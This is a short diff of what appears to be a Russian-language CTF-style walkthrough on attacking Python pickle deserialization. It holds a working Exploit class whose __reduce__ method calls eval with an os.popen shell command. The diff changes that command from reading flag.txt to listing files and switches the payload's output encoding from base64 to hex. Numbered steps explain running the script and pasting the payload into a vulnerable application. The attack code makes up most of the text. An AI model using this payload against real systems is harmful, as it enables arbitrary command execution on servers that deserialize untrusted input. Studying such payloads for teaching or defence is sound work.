@@ -6,12 +6,13 @@ import base64
 
 class Exploit:
     def __reduce__(self):
-        return (eval, ("__import__('os').popen('cat flag.txt').read()",))
+        return (eval, ("__import__('os').popen('ls -la').read()",))
 
 
 p = pickle.dumps(Exploit(), protocol=2)
-print(base64.b64encode(p).decode())
+print(p.hex())
 
 2. Запускаем скрипт и получаем полезную нагрузку
 python3 exploit.py
+
 3. Вставляем полученную строку в уязвимое приложение, которое использует pickle для десериализации данных
